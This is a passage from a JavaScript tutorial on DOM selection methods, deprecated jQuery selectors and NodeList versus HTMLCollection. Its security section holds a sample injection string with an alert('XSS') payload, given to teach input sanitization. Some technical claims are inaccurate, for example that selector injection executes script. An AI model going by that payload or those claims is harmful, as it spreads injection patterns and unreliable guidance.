document.querySelector('[title*="important"]');

// Case-insensitive matching (CSS4)
document.querySelector('[data-value="test" i]');
```

#### Combinators

All CSS combinators function correctly:

```javascript
// Descendant (space)
document.querySelector('article p');

// Child (>)
document.querySelector('ul > li');

// Adjacent sibling (+)
document.querySelector('h2 + p');

// General sibling (~)
document.querySelector('h2 ~ p');
```

### Edge Cases and Gotchas

#### ID Selectors with Special Characters

IDs containing special characters must be escaped:

```javascript
// ID="my:id"
document.querySelector('#my\\:id');

// ID="item.1"
document.querySelector('#item\\.1');

// ID with spaces (invalid HTML but can exist)
document.querySelector('#my\\ id');
```

#### :scope Pseudo-class

The `:scope` pseudo-class represents the reference element (the element on which `querySelector` was called):

```javascript
const div = document.querySelector('#container');

// Matches direct children of #container with class "item"
div.querySelector(':scope > .item');

// Without :scope, would match .item anywhere in descendants
// then filter for direct children - different behavior
```

This is particularly useful for avoiding context issues where selectors might match ancestors:

```javascript
<div class="outer">
  <div class="inner" id="target">
    <span class="item">A</span>
  </div>
</div>

const inner = document.getElementById('target');

// Would match the .outer div if it has .item descendants
inner.querySelector('.outer .item'); // ❌ Unexpected

// Properly scopes to descendants only
inner.querySelector(':scope .item'); // ✓ Correct
```

#### Null Return Handling

Always check for `null` before accessing properties:

```javascript
const element = document.querySelector('.might-not-exist');

// Unsafe - throws TypeError if null
element.classList.add('new-class');

// Safe patterns
element?.classList.add('new-class');

if (element) {
  element.classList.add('new-class');
}

const classes = element?.classList ?? [];
```

#### Dynamic Content and Timing

`querySelector` operates on the current DOM state. Elements added after the query won't be included:

```javascript
document.querySelector('.dynamic'); // null

setTimeout(() => {
  const div = document.createElement('div');
  div.className = 'dynamic';
  document.body.appendChild(div);
  
  document.querySelector('.dynamic'); // now found
}, 100);
```

For dynamic content, consider:

- Re-querying after DOM modifications
- Event delegation instead of direct element queries
- MutationObserver for automatic detection
- Live collections (`getElementsByClassName`) for automatically updating references

### Selector Context Matching Behavior

An often-misunderstood aspect: selectors are evaluated against the entire document, then filtered to descendants:

```javascript
<div id="outer">
  <div id="inner">
    <span>Target</span>
  </div>
</div>

const inner = document.getElementById('inner');

// This WILL work - selector matches in global context,
// then result is filtered to descendants
inner.querySelector('#outer span'); // Returns the span

// The selector "#outer span" is valid globally,
// and span is a descendant of inner
```

To explicitly limit to descendants without ancestor matching, use `:scope`:

```javascript
// Only matches if inner itself matches #outer
inner.querySelector(':scope#outer span'); // null

// Direct descendant matching
inner.querySelector(':scope > span'); // Works
```

### Integration with Modern APIs

#### With Intersection Observer

```javascript
const target = document.querySelector('.lazy-load');
const observer = new IntersectionObserver(entries => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      entry.target.src = entry.target.dataset.src;
    }
  });
});
observer.observe(target);
```

#### With Mutation Observer

```javascript
const container = document.querySelector('#dynamic-container');
const observer = new MutationObserver(mutations => {
  mutations.forEach(mutation => {
    mutation.addedNodes.forEach(node => {
      if (node.nodeType === 1 && node.matches('.watchable')) {
        // Process new matching element
      }
    });
  });
});
observer.observe(container, { childList: true, subtree: true });
```

#### With Web Components

```javascript
class MyComponent extends HTMLElement {
  connectedCallback() {
    // Query within shadow DOM
    const slot = this.shadowRoot.querySelector('slot');
    const internal = this.shadowRoot.querySelector('.internal');
    
    // Query light DOM (won't find shadow DOM elements)
    const external = this.querySelector('.light-dom-child');
  }
}
```

### Alternative Patterns and When to Use Them

#### querySelector vs getElementById

```javascript
// When you only have an ID - use getElementById
const byId = document.getElementById('unique'); // Faster

// When combining ID with other selectors - use querySelector
const combined = document.querySelector('#unique.active[data-loaded]');
```

#### querySelector vs getElementsBy* Methods

```javascript
// Single element needed
document.querySelector('.item'); // Good

// Multiple elements, no live updates needed
document.querySelectorAll('.items'); // Good

// Need live collection that updates automatically
const liveCollection = document.getElementsByClassName('items');
// liveCollection automatically updates when DOM changes
```

#### Element.matches() for Testing

```javascript
const element = document.querySelector('.item');

// Test if element matches selector
if (element.matches('.item.active')) {
  // More efficient than re-querying
}
```

#### Element.closest() for Ancestor Matching

```javascript
const button = document.querySelector('.submit-btn');

// Find closest ancestor form
const form = button.closest('form');

// More efficient than:
let parent = button.parentElement;
while (parent && parent.tagName !== 'FORM') {
  parent = parent.parentElement;
}
```

### Security Considerations

#### Injection Vulnerabilities

Never construct selectors from untrusted input without sanitization:

```javascript
// DANGEROUS - user input in selector
const userId = getUserInput(); // Could be: "'; alert('XSS'); '"
document.querySelector(`#user-${userId}`); // Vulnerable

// SAFER - validate/sanitize first
const safeId = userId.replace(/[^a-zA-Z0-9-_]/g, '');
document.querySelector(`#user-${safeId}`);

// SAFEST - use data attributes and exact matching
document.querySelector(`[data-user-id="${userId.replace(/"/g, '')}"]`);
```

#### CSS Selector Complexity Attacks

Extremely complex selectors can cause performance degradation:

```javascript
// Potentially problematic - deeply nested
document.querySelector('div '.repeat(100) + 'span');

// Set reasonable limits on selector complexity
// Validate selector strings before use
```

### Cross-browser Considerations

`querySelector` is widely supported (IE8+), but some selector features have varying support:

- `:scope` - No IE support, modern browsers only
- Case-insensitive attribute matching `[attr="val" i]` - CSS4, limited older browser support
- `:has()` - Very recent, check compatibility
- `:is()`, `:where()` - Modern browsers only

```javascript
// Feature detection for advanced selectors
function supportsSelector(selector) {
  try {
    document.querySelector(selector);
    return true;
  } catch (e) {
    return false;
  }
}

if (supportsSelector(':has(.child)')) {
  // Use modern selector
} else {
  // Fallback approach
}
```

### Debugging and Development

#### Common Debugging Patterns

```javascript
// Verify selector matches anything
const result = document.querySelector('.target');
console.assert(result !== null, 'Selector found no matches');

// Test selector in console
$$('.target'); // Chrome DevTools shorthand for querySelectorAll

// Highlight matched element
document.querySelector('.target')?.scrollIntoView({ 
  behavior: 'smooth', 
  block: 'center' 
});
```

#### Performance Profiling

```javascript
console.time('querySelector');
const element = document.querySelector('.complex > .selector');
console.timeEnd('querySelector');

// Compare with alternatives
console.time('getElementById');
const element2 = document.getElementById('simple');
console.timeEnd('getElementById');
```

---

## querySelectorAll

### Method Signature and Return Value

`document.querySelectorAll(selectors)` and `element.querySelectorAll(selectors)` return a static `NodeList` containing all elements that match the specified CSS selector string. The NodeList is non-live, meaning it doesn't automatically update when the DOM changes after the method executes.

```javascript
const elements = document.querySelectorAll('.class, #id, [attribute]');
// Returns: NodeList [element1, element2, ...]
```

### Selector Syntax Coverage

#### Combinators and Relationships

```javascript
// Descendant combinator (space)
document.querySelectorAll('div p'); // All <p> descendants of <div>

// Child combinator (>)
document.querySelectorAll('ul > li'); // Direct <li> children only

// Adjacent sibling (+)
document.querySelectorAll('h2 + p'); // <p> immediately following <h2>

// General sibling (~)
document.querySelectorAll('h2 ~ p'); // All <p> siblings after <h2>
```

#### Attribute Selectors

```javascript
// Presence
document.querySelectorAll('[data-id]'); // Has attribute

// Exact match
document.querySelectorAll('[type="text"]');

// Contains word
document.querySelectorAll('[class~="active"]'); // Class list contains "active"

// Starts with
document.querySelectorAll('[href^="https"]');

// Ends with
document.querySelectorAll('[src$=".jpg"]');

// Contains substring
document.querySelectorAll('[title*="search"]');

// Starts with or is followed by hyphen
document.querySelectorAll('[lang|="en"]'); // Matches "en" or "en-US"

// Case-insensitive (i flag)
document.querySelectorAll('[type="TEXT" i]');

// Case-sensitive (s flag)
document.querySelectorAll('[type="text" s]');
```

#### Pseudo-classes

```javascript
// Structural
document.querySelectorAll('li:first-child');
document.querySelectorAll('li:last-child');
document.querySelectorAll('li:nth-child(2n)'); // Even children
document.querySelectorAll('li:nth-child(3n+1)'); // 1st, 4th, 7th...
document.querySelectorAll('li:nth-last-child(2)');
document.querySelectorAll('p:only-child');
document.querySelectorAll('div:empty');

// Type-based
document.querySelectorAll('p:first-of-type');
document.querySelectorAll('p:last-of-type');
document.querySelectorAll('p:nth-of-type(odd)');
document.querySelectorAll('p:only-of-type');

// State
document.querySelectorAll('input:checked');
document.querySelectorAll('input:disabled');
document.querySelectorAll('input:enabled');
document.querySelectorAll('option:selected'); // Note: Limited browser support
document.querySelectorAll(':focus');
document.querySelectorAll('a:visited'); // Returns empty for privacy reasons

// Negation
document.querySelectorAll('li:not(.excluded)');
document.querySelectorAll('input:not([type="hidden"])');

// Link/target
document.querySelectorAll(':target'); // Element matching URL fragment
document.querySelectorAll('a:link'); // Unvisited links
```

#### Pseudo-elements Limitation

[Unverified] `querySelectorAll` cannot select pseudo-elements (`::before`, `::after`, `::first-line`, etc.) as they aren't part of the DOM tree. These exist only in the rendering layer.

### NodeList vs HTMLCollection

The returned `NodeList` differs from `HTMLCollection` (returned by methods like `getElementsByClassName`):

```javascript
const nodeList = document.querySelectorAll('.item');
const htmlCollection = document.getElementsByClassName('item');

// Static vs Live
document.body.appendChild(newElement); // Has class "item"
console.log(nodeList.length); // Unchanged
console.log(htmlCollection.length); // Increases by 1

// Array-like iteration
nodeList.forEach(el => {}); // ✓ Has forEach
htmlCollection.forEach(el => {}); // ✗ No forEach (need Array.from)

// Array conversion
[...nodeList] // Spread
Array.from(nodeList) // Array.from
Array.prototype.slice.call(nodeList) // Legacy approach
```

### Performance Characteristics

#### Complexity Considerations

[Inference] The method performs a full tree traversal from the context node. Complex selectors with multiple combinators and pseudo-classes require more processing time. Specificity doesn't affect performance—selector complexity does.

```javascript
// More performant (simpler selector)
document.querySelectorAll('.item');

// Less performant (complex traversal)
document.querySelectorAll('body > div > section > article > p:nth-child(2n) > span.highlight');
```

#### Scoping for Optimization

```javascript
// Searches entire document
document.querySelectorAll('.button');

// Searches only within container
const container = document.getElementById('sidebar');
container.querySelectorAll('.button'); // Narrower scope = faster
```

#### Comparison with Specific Methods

```javascript
// For single class, ID, or tag:
document.getElementsByClassName('item'); // Generally faster, returns live collection
document.getElementById('unique'); // Fastest for IDs
document.getElementsByTagName('div'); // Fast for tags

// querySelectorAll advantage: complex selectors in one call
document.querySelectorAll('section.active > .item:not(.hidden)');
// vs.
// Multiple method calls + manual filtering
```

### Scope and Context

#### Document vs Element Context

```javascript
// Global scope
document.querySelectorAll('p'); // All paragraphs in document

// Element scope
const article = document.querySelector('article');
article.querySelectorAll('p'); // Only paragraphs within that article
```

#### :scope Pseudo-class

```javascript
const container = document.querySelector('.container');

// Without :scope - selects ANY div p in document within container
container.querySelectorAll('div p');

// With :scope - selects p that are descendants of div children of container
container.querySelectorAll(':scope > div p');
```

### Edge Cases and Gotchas

#### Invalid Selectors

```javascript
try {
  document.querySelectorAll('div:invalid-pseudo');
} catch (e) {
  // Throws DOMException: SyntaxError
}

try {
  document.querySelectorAll('[unclosed');
} catch (e) {
  // Throws DOMException: SyntaxError
}
```

#### Empty Selectors

```javascript
document.querySelectorAll(''); // Throws SyntaxError
document.querySelectorAll('   '); // Throws SyntaxError
```

#### ID Selectors with Special Characters

```javascript
// IDs with special characters must be escaped
// <div id="my:id"></div>
document.querySelectorAll('#my\\:id'); // Backslash escapes the colon

// <div id="123start"></div>
document.querySelectorAll('#\\31 23start'); // Escape leading digit
```

#### Case Sensitivity

```javascript
// Tag names and attribute names: case-insensitive in HTML
document.querySelectorAll('DIV'); // Works
document.querySelectorAll('[DATA-ID]'); // Works

// Attribute values and classes: case-sensitive by default
document.querySelectorAll('[type="Text"]'); // Won't match type="text"
document.querySelectorAll('.MyClass'); // Won't match class="myclass"

// Use case-insensitive flag
document.querySelectorAll('[type="Text" i]'); // Matches type="text"
```

#### Duplicate Results

```javascript
// Multiple selectors can match same element
document.querySelectorAll('.item, .active');
// If element has both classes, appears only ONCE in NodeList
```

### Practical Patterns

#### Selecting Multiple Unrelated Elements

```javascript
// Comma-separated selectors
const elements = document.querySelectorAll('header, footer, .sidebar');
```

#### Negating Multiple Conditions

```javascript
// Exclude multiple classes/types
document.querySelectorAll('input:not([type="hidden"]):not([type="submit"])');

// Exclude elements with specific attributes
document.querySelectorAll('div:not([data-exclude])');
```

#### Data Attribute Queries

```javascript
// Exact match
document.querySelectorAll('[data-status="active"]');

// Partial match
document.querySelectorAll('[data-id^="user-"]'); // IDs starting with "user-"

// Multiple data attributes
document.querySelectorAll('[data-type="product"][data-category="electronics"]');
```

#### Form-Specific Selections

```javascript
// All checked inputs
document.querySelectorAll('input:checked');

// Required fields that are empty
document.querySelectorAll('input:required:invalid');

// Valid inputs
document.querySelectorAll('input:valid');

// Radio buttons by name
document.querySelectorAll('input[type="radio"][name="size"]');

// Selected options within select
const select = document.querySelector('select');
select.querySelectorAll('option:checked');
```

#### Combining with Array Methods

```javascript
// Filter NodeList
const filtered = [...document.querySelectorAll('.item')]
  .filter(el => el.offsetHeight > 100);

// Map to extract data
const texts = [...document.querySelectorAll('p')]
  .map(p => p.textContent);

// Find first matching condition
const firstLarge = [...document.querySelectorAll('.item')]
  .find(el => el.offsetWidth > 500);

// Check condition
const allVisible = [...document.querySelectorAll('.item')]
  .every(el => el.offsetHeight > 0);
```

### Browser Compatibility Notes

[Unverified] The method has been supported since IE8 (with CSS2.1 selectors only). Modern selector features like `:scope`, `:is()`, `:where()`, and newer pseudo-classes may not work in older browsers. The `i` and `s` flags for attribute selectors have more limited support.

### Memory and Performance Considerations

#### Static Snapshot Advantages

```javascript
// Safe iteration even with DOM modifications
const items = document.querySelectorAll('.item');
items.forEach(item => {
  item.parentNode.removeChild(item); // Modifying DOM during iteration
  // NodeList remains unchanged, iteration continues safely
});
```

#### Memory Implications

[Inference] Since the NodeList is static, it holds references to elements even if they're removed from the DOM, potentially preventing garbage collection until the NodeList itself is released.

```javascript
function processElements() {
  const elements = document.querySelectorAll('.temporary');
  // elements array holds references
  
  elements.forEach(el => el.remove());
  // Elements removed from DOM but still referenced by 'elements'
  
} // elements goes out of scope here, allowing garbage collection
```

### Alternative Approaches

#### querySelector for Single Element

```javascript
// Returns first match or null
const first = document.querySelector('.item');

// More efficient than:
const firstAlt = document.querySelectorAll('.item')[0];
```

#### matches() for Testing

```javascript
const element = document.getElementById('test');

// Test if element matches selector
if (element.matches('.active')) {
  // Element has active class
}

// Check against multiple selectors
if (element.matches('.active, .selected, [data-active="true"]')) {
  // Matches at least one
}
```

#### closest() for Ancestor Matching

```javascript
const button = document.querySelector('button');

// Find closest ancestor matching selector
const form = button.closest('form');
const container = button.closest('.container');
```

---

## Deprecated Selection Methods

### jQuery Selection Methods

#### `.andSelf()` (Deprecated in 1.8, Removed in 3.0)

Replaced by `.addBack()`. The method added the previous set of elements on the stack to the current set. The naming was confusing as it didn't clearly communicate that it was adding the previous selection back.

```javascript
// Deprecated
$('div').find('p').andSelf().addClass('highlight');

// Current
$('div').find('p').addBack().addClass('highlight');
```

#### `.context` Property (Deprecated in 1.10, Removed in 3.0)

This property referenced the DOM node context originally passed to `jQuery()`. Removal occurred because the context parameter itself was deprecated, and the property had limited practical use in modern jQuery patterns.

#### `.selector` Property (Deprecated in 1.7, Removed in 3.0)

Contained the selector string originally passed to `jQuery()`. Deprecated because it didn't accurately represent selections created through chaining or manipulation methods, leading to incorrect assumptions about what was selected.

#### `.size()` (Deprecated in 1.8, Removed in 3.0)

Replaced by `.length` property. The method returned the number of elements in the jQuery object but was redundant since the `.length` property provided the same information more efficiently without function call overhead.

```javascript
// Deprecated
var count = $('div').size();

// Current
var count = $('div').length;
```

### Browser Native Selection APIs

#### `document.all` (Non-standard, Deprecated)

Internet Explorer's proprietary collection of all elements in the document. Never standardized and creates cross-browser compatibility issues. Replaced by standard methods like `document.getElementsByTagName('*')`, `document.querySelectorAll('*')`, or more specific selectors.

```javascript
// Deprecated
var elements = document.all;

// Current
var elements = document.querySelectorAll('*');
```

#### `document.layers` and `document.layers[id]` (Netscape 4, Obsolete)

Netscape Navigator 4's layer access mechanism. Completely obsolete with Netscape 4's discontinuation. No modern equivalent needed as standard DOM methods replaced this functionality.

#### Non-standard Selector Extensions

##### `:contains()` in Native CSS

While available in jQuery, `:contains()` was never part of CSS Selectors specifications. Some browsers experimented with `:-webkit-contains()` or similar, but these are deprecated. Text content matching should be done via JavaScript:

```javascript
// Not reliable/deprecated in native CSS
// element:-webkit-contains('text')

// Current approach
Array.from(document.querySelectorAll('p')).filter(el => 
  el.textContent.includes('text')
);
```

##### `>>>` (Shadow-piercing Descendant Combinator)

Originally proposed for styling into shadow DOM, the `>>>` combinator (also as `/deep/`) was deprecated and removed from specifications. Shadow DOM styling now uses `::part()` and CSS custom properties for controlled styling across shadow boundaries.

```css
/* Deprecated */
.parent >>> .child { }
.parent /deep/ .child { }

/* Current */
.parent::part(child-part) { }
```

### Deprecated Pseudo-classes and Pseudo-elements

#### Single Colon Pseudo-elements (CSS2.1 Syntax)

While still supported for backwards compatibility, single-colon syntax for pseudo-elements (`:before`, `:after`, `:first-letter`, `:first-line`) is technically deprecated in favor of double-colon syntax to distinguish them from pseudo-classes.

```css
/* Old syntax (still works but deprecated)*/
p:before { content: "→ "; }
p:after { content: " ←"; }

/* Current syntax */
p::before { content: "→ "; }
p::after { content: " ←"; }
```

### XPath Selection Methods

#### `document.evaluate()` with Namespace Resolver Issues

While `document.evaluate()` itself isn't deprecated, certain patterns and the default namespace resolver behavior have proven problematic. The implicit namespace handling in HTML documents has led to inconsistent behavior, making CSS selectors preferred for most use cases.

```javascript
// Complex and prone to issues
var result = document.evaluate(
  '//div[@class="example"]',
  document,
  null,
  XPathResult.FIRST_ORDERED_NODE_TYPE,
  null
);

// Preferred modern approach
var element = document.querySelector('div.example');
```

### Framework-Specific Deprecated Selectors

#### Prototype.js Methods

##### `$$()` Function Usage Patterns

While `$$()` itself persists in some codebases, the framework Prototype.js that introduced it is no longer maintained. The method provided CSS selector functionality before native `querySelectorAll()` existed.

```javascript
// Deprecated (Prototype.js)
var divs = $$('div.className');

// Current
var divs = document.querySelectorAll('div.className');
```

##### `.getElementsByClassName()` Polyfills

Early Prototype.js versions implemented `.getElementsByClassName()` before it was standardized. These polyfills are now unnecessary as the method is universally supported.

#### MooTools Selectors

##### `$()` and `$$()` with Extended Features

MooTools extended these methods with custom pseudo-selectors and filters that went beyond standard CSS. These extensions created vendor lock-in and are deprecated in favor of standard APIs.

#### Dojo Deprecated Query Methods

##### `dojo.query()` Extensions

Dojo's query engine included non-standard extensions like `:even`, `:odd`, and custom attribute matching patterns. The framework has moved toward standard `querySelectorAll()` usage.

### Internet Explorer Specific Methods (All Deprecated)

#### `.querySelectorAll()` with Non-standard Behavior (IE8)

IE8's implementation of `querySelectorAll()` had quirks where it couldn't select elements with unquoted attribute values or certain pseudo-classes. Required workarounds that are no longer necessary.

#### `document.selection` (IE-only API)

Replaced by the standard Selection API. Used for getting and manipulating text selections in IE:

```javascript
// Deprecated (IE only)
var selection = document.selection;
var range = selection.createRange();

// Current (Standard Selection API)
var selection = window.getSelection();
var range = selection.getRangeAt(0);
```

#### `.createTextRange()` (IE-only)

IE's proprietary range creation method, replaced by standard `document.createRange()`.

### CSS4 Selector Deprecations and Changes

#### `:matches()` Renamed to `:is()`

The `:matches()` pseudo-class was renamed to `:is()` for clarity. Some browsers supported `:matches()` or `:-webkit-matches()` or `:-moz-any()` before standardization.

```css
/* Deprecated vendor prefixes */
:-webkit-matches(.class1, .class2) { }
:-moz-any(.class1, .class2) { }

/* Old name */
:matches(.class1, .class2) { }

/* Current standard */
:is(.class1, .class2) { }
```

#### `:any()` Vendor Prefix

Mozilla's `:-moz-any()` was the precursor to `:is()`. Fully deprecated in favor of the standard syntax.

### Performance-Related Deprecated Patterns

#### Right-to-Left Selector Optimization Assumptions

Early CSS optimization advice suggested structuring selectors assuming left-to-right parsing. Modern browsers parse selectors right-to-left, making many old optimization patterns obsolete or counterproductive. [Inference: While the parsing direction is established, the impact of specific optimization patterns varies by browser implementation]

#### Universal Selector Avoidance Dogma

The blanket advice to never use `*` selector stemmed from older browser performance characteristics. Modern engines handle universal selectors efficiently in most contexts, though they should still be used judiciously.

### Attribute Selector Deprecated Patterns

#### Unquoted Attribute Values in Selectors

While technically still supported in some contexts, using unquoted attribute values in selectors can cause parsing issues and is discouraged:

```css
/* Problematic/deprecated pattern */
[data-value=some-value] { }

/* Current best practice */
[data-value="some-value"] { }
```

#### Case-Sensitivity Confusion

Older implementations had inconsistent case-sensitivity handling for attribute selectors. The `i` flag for case-insensitive matching standardized this:

```css
/* Old approach: assuming case-insensitive */
[class~="Example"] { }

/* Current: explicit case-insensitive matching */
[class~="Example" i] { }
```

### jQuery Extended Selectors (Non-standard)

#### `:eq()`, `:lt()`, `:gt()`, `:even`, `:odd`

These jQuery-specific pseudo-selectors don't exist in CSS specifications and don't work with native `querySelectorAll()`. They require jQuery to function and promote jQuery-specific code:

```javascript
// jQuery-specific (doesn't work natively)
$('li:eq(2)');
$('tr:even');

// Native alternatives using array methods
document.querySelectorAll('li')[2];
Array.from(document.querySelectorAll('tr')).filter((_, i) => i % 2 === 0);
```

#### `:first`, `:last` (jQuery)

Not standard CSS pseudo-classes. CSS uses `:first-child`, `:last-child`, `:first-of-type`, or `:last-of-type`.

```javascript
// jQuery-specific
$('p:first');

// Native CSS
document.querySelector('p:first-of-type');
// or
document.querySelector('p');
```

#### `:parent` (jQuery)

Selected elements that have child nodes. No direct CSS equivalent; requires JavaScript filtering:

```javascript
// jQuery-specific
$('div:parent');

// Native alternative
Array.from(document.querySelectorAll('div')).filter(el => 
  el.childNodes.length > 0
);
```

#### `:input` (jQuery)

Selected all input, textarea, select, and button elements. No CSS equivalent; requires complex selector or JavaScript:

```javascript
// jQuery-specific
$(':input');

// Native alternative
document.querySelectorAll('input, textarea, select, button');
```

### Form-Related Deprecated Selectors

#### `:text`, `:checkbox`, `:radio`, etc. (jQuery)

jQuery provided shortcuts for input type selection that don't exist in CSS:

```javascript
// jQuery-specific
$(':text');
$(':checkbox');

// Native CSS
document.querySelectorAll('input[type="text"]');
document.querySelectorAll('input[type="checkbox"]');
```

#### `:selected` (jQuery for `<option>`)

While HTML has a `selected` attribute, jQuery's `:selected` pseudo-class doesn't translate to native CSS. Use JavaScript property access:

```javascript
// jQuery-specific
$('option:selected');

// Native alternative
Array.from(document.querySelectorAll('option')).filter(opt => opt.selected);
```

### Visibility-Related Deprecated Patterns

#### `:hidden` and `:visible` (jQuery)

These jQuery selectors check computed visibility, which CSS selectors cannot directly evaluate. [Inference: The complexity stems from multiple factors affecting visibility - display, visibility, opacity, dimensions, and position]

```javascript
// jQuery-specific
$('div:hidden');
$('div:visible');

// Native alternatives require checking computed styles
Array.from(document.querySelectorAll('div')).filter(el => {
  const style = window.getComputedStyle(el);
  return style.display === 'none' || 
         style.visibility === 'hidden' || 
         style.opacity === '0';
});
```

### Animation and State Selectors (jQuery)

#### `:animated` (jQuery)

Selected elements currently being animated by jQuery's animation methods. No CSS equivalent as it's jQuery implementation-specific:

```javascript
// jQuery-specific
$(':animated');

// Native alternative: track animations manually
// No direct equivalent - requires maintaining animation state
```

### Header Selector Shorthand (jQuery)

#### `:header` (jQuery)

Selected all heading elements (`h1` through `h6`). Simple CSS alternative exists:

```javascript
// jQuery-specific
$(':header');

// Native CSS
document.querySelectorAll('h1, h2, h3, h4, h5, h6');
```

### Content Filtering (jQuery Extended)

#### `:has()` Implementation Differences

While `:has()` is now standard CSS (as of CSS Selectors Level 4), jQuery's implementation predated and differs slightly from the CSS version. jQuery's `:has()` was more forgiving with selectors and had different specificity behavior.

```javascript
// jQuery version (more forgiving)
$('div:has(p)');

// Native CSS (now standardized)
document.querySelectorAll('div:has(p)');
```

[Unverified: The exact performance characteristics and edge case handling differences between jQuery's `:has()` and native CSS `:has()` implementations across all scenarios]

### Sizzle Engine Specific Features

Since jQuery used the Sizzle selector engine (now integrated), several Sizzle-specific optimizations and extensions are deprecated:

#### Custom Pseudo-class Definitions

Sizzle allowed defining custom pseudo-classes via `jQuery.expr[':']`. This pattern is deprecated in favor of using standard JavaScript filtering:

```javascript
// Deprecated pattern
$.expr[':'].customSelector = function(elem) {
  return /* custom logic */;
};

// Current approach
Array.from(document.querySelectorAll('div')).filter(elem => {
  return /* custom logic */;
});
```

### Migration Considerations

When moving away from deprecated selection methods, key considerations include:

**Performance**: Native methods like `querySelectorAll()` are generally faster than library-based selectors.

**Return Type Differences**: jQuery returns jQuery objects; native methods return NodeList or HTMLCollection, requiring different iteration patterns.

**Live vs. Static Collections**: `getElementsByClassName()` and `getElementsByTagName()` return live collections; `querySelectorAll()` returns static NodeList.

**Caching Strategies**: Without jQuery's implicit caching, manual caching becomes more important for repeated selections.

**Chaining**: Native methods don't support jQuery-style chaining, requiring different code organization patterns.

---

## NodeList vs HTMLCollection

Both `NodeList` and `HTMLCollection` are array-like objects that represent collections of nodes, but they differ fundamentally in what they contain, when they update, and how they behave.

### Type of Nodes Contained

**HTMLCollection** contains only **Element nodes** (nodeType 1). Specifically, it holds `Element` objects, typically `HTMLElement` instances representing HTML tags. Text nodes, comment nodes, and other node types cannot exist in an HTMLCollection.

**NodeList** contains any type of **Node**, including:

- Element nodes
- Text nodes (including whitespace)
- Comment nodes
- Processing instruction nodes
- Any other node type in the DOM

This fundamental difference affects which DOM methods return which collection type.

### Live vs Static Behavior

**HTMLCollection** is always **live**. The collection automatically reflects DOM changes in real-time. If elements are added, removed, or modified, the HTMLCollection updates immediately without re-querying.

```javascript
const divs = document.getElementsByTagName('div'); // HTMLCollection
console.log(divs.length); // 5

document.body.appendChild(document.createElement('div'));
console.log(divs.length); // 6 - automatically updated
```

**NodeList** can be either **live** or **static**, depending on how it was created:

**Live NodeLists** (rare):

- `element.childNodes` - returns live NodeList of all child nodes
- Changes to children automatically reflect in the collection

```javascript
const children = document.body.childNodes; // Live NodeList
console.log(children.length); // 10

document.body.appendChild(document.createTextNode('text'));
console.log(children.length); // 11 - updated automatically
```

**Static NodeLists** (common):

- `querySelectorAll()` - returns static snapshot
- Frozen at the moment of query execution
- Never updates, even if matching elements are added/removed

```javascript
const paragraphs = document.querySelectorAll('p'); // Static NodeList
console.log(paragraphs.length); // 3

document.body.appendChild(document.createElement('p'));
console.log(paragraphs.length); // Still 3 - snapshot unchanged
```

### Methods That Return Each Type

**HTMLCollection returned by**:

- `getElementsByClassName(className)`
- `getElementsByTagName(tagName)`
- `getElementsByTagNameNS(namespace, tagName)`
- `element.children` (not `childNodes`)
- `document.forms`, `document.images`, `document.links`, `document.scripts`
- `form.elements`

**NodeList returned by**:

- `querySelectorAll(selector)` - static
- `element.childNodes` - live
- Various older DOM methods like `getElementsByName()` [Unverified: browser-specific behavior may vary]

### Access Methods

**HTMLCollection** supports:

- **Numeric indexing**: `collection[0]`, `collection[1]`
- **Named access**: `collection['elementId']` or `collection.elementId` - retrieves elements by `id` or `name` attribute
- `item(index)` method
- `namedItem(name)` method - retrieves by `id` or `name`
- `length` property

```javascript
const forms = document.forms; // HTMLCollection
forms[0];              // First form
forms['loginForm'];    // Form with id="loginForm"
forms.loginForm;       // Same as above
forms.namedItem('loginForm');
```

**NodeList** supports:

- **Numeric indexing**: `nodeList[0]`, `nodeList[1]`
- `item(index)` method
- `length` property
- `forEach()` method (modern browsers) - directly iterate without conversion
- **No named access** - cannot retrieve by `id` or `name`

```javascript
const nodes = document.querySelectorAll('p'); // NodeList
nodes[0];              // First paragraph
nodes.item(0);         // Same as above
nodes.forEach(node => console.log(node)); // Works directly
```

### Iteration Patterns

**HTMLCollection** is not directly iterable with `forEach` in older environments:

```javascript
const collection = document.getElementsByClassName('item');

// Convert to array for forEach
Array.from(collection).forEach(element => { /* ... */ });
[...collection].forEach(element => { /* ... */ });

// Classic for loop
for (let i = 0; i < collection.length; i++) {
  const element = collection[i];
}

// for...of (modern browsers)
for (const element of collection) { /* ... */ }
```

**NodeList** with `forEach` (modern browsers):

```javascript
const nodeList = document.querySelectorAll('.item');

// Direct forEach (ES2015+)
nodeList.forEach(node => { /* ... */ });

// for...of
for (const node of nodeList) { /* ... */ }

// Classic for loop
for (let i = 0; i < nodeList.length; i++) {
  const node = nodeList[i];
}
```

[Inference] The `forEach` method on NodeList was added in later specifications and may not be available in older browsers without polyfills.

### Performance Implications

**Live collections** (HTMLCollection, live NodeList):

- [Inference] Potentially slower for repeated access because the browser may need to re-query the DOM to ensure accuracy
- Efficient for tracking changes without re-querying
- Can cause infinite loops if modifying matching elements during iteration:

```javascript
const divs = document.getElementsByTagName('div'); // Live HTMLCollection

// Infinite loop - length increases as divs are added
for (let i = 0; i < divs.length; i++) {
  document.body.appendChild(document.createElement('div'));
}

// Solution: cache length or convert to array
const length = divs.length;
for (let i = 0; i < length; i++) { /* ... */ }
```

**Static NodeList**:

- [Inference] No overhead from live updates after creation
- Must re-query to see DOM changes
- Safe to modify DOM during iteration without affecting the collection

### Common Pitfalls

**Modifying live collections during iteration**:

```javascript
// Dangerous - live HTMLCollection
const divs = document.getElementsByClassName('remove-me');
for (let i = 0; i < divs.length; i++) {
  divs[i].remove(); // Collection shrinks, skipping elements
}

// Solution: iterate backwards
for (let i = divs.length - 1; i >= 0; i--) {
  divs[i].remove();
}

// Or convert to static array
Array.from(divs).forEach(div => div.remove());
```

**Expecting NodeList to be an array**:

```javascript
const nodeList = document.querySelectorAll('p');

// These don't exist on NodeList
nodeList.map(n => n.textContent);     // Error
nodeList.filter(n => n.id);           // Error
nodeList.reduce((acc, n) => acc + 1, 0); // Error

// Must convert first
Array.from(nodeList).map(n => n.textContent); // Works
[...nodeList].filter(n => n.id);              // Works
```

**Named access confusion**:

```javascript
// Works with HTMLCollection
const forms = document.forms;
forms['myForm']; // Returns form with id="myForm"

// Doesn't work with NodeList
const nodes = document.querySelectorAll('form');
nodes['myForm']; // undefined - numeric indexing only
```

### Conversion to Arrays

Both can be converted to true arrays for full array method access:

```javascript
// ES6 spread operator
const arrayFromCollection = [...htmlCollection];
const arrayFromNodeList = [...nodeList];

// Array.from()
const arrayFromCollection = Array.from(htmlCollection);
const arrayFromNodeList = Array.from(nodeList);

